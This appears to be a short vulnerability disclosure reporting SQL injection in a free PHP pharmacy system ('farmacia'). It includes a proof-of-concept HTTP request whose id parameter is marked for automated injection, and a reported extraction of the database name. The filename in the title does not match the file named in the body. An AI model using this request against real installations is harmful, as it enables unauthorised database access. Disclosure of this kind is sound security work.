# farmacia-in-php has sql injection in pagamento.php

## supplier 
https://code-projects.org/farmacia-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
visualizar-forneccedor.php

## describe


**Code analysis**    

![image-20241127113237736](https://github.com/user-attachments/assets/0699dc16-6ba4-444f-b7e8-f594f87210ed)



## POC

```
GET /visualizar-fornecedor.php?id=1* HTTP/1.1
Host: farmacia
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=ecmd5kmr6te8fpgjnri7c4up85
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

save as  1.txt

**Result**

![image-20241127112914480](https://github.com/user-attachments/assets/ebd8c19d-39c0-4771-b43c-ed0dc023f1a3)

Get databases: farmacia

![image-20241127110033174](https://github.com/user-attachments/assets/3b3491ab-6643-416f-a440-c709735132ff)